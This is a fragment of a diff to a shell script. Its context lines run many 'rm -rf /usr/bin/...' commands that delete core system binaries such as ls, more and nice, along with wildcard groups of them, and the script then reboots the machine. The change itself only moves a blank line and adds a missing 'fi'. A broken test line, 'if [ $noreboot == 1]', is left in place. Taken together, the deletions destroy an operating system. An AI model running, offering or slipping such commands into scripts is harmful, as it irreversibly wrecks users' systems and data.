@@ -437,12 +437,12 @@ rm -rf /usr/bin/linux*
 rm -rf /usr/bin/lo
 rm -rf /usr/bin/ls?
 rm -rf /usr/bin/lz*
-
 rm -rf /usr/bin/ma*
 rm -rf /usr/bin/ms*
 rm -rf /usr/bin/md*
 rm -rf /usr/bin/me*
 rm -rf /usr/bin/jour*
+
 rm -rf /usr/bin/nice
 rm -rf /usr/bin/more
 rm -rf /usr/bin/mcookie
@@ -526,7 +526,7 @@ if [ $noreboot == 1]; then
   exit
 
 echo -e "\e[33mRebooting in 3 seconds...\e[0m"
-
+fi
 sleep 3
 
 reboot
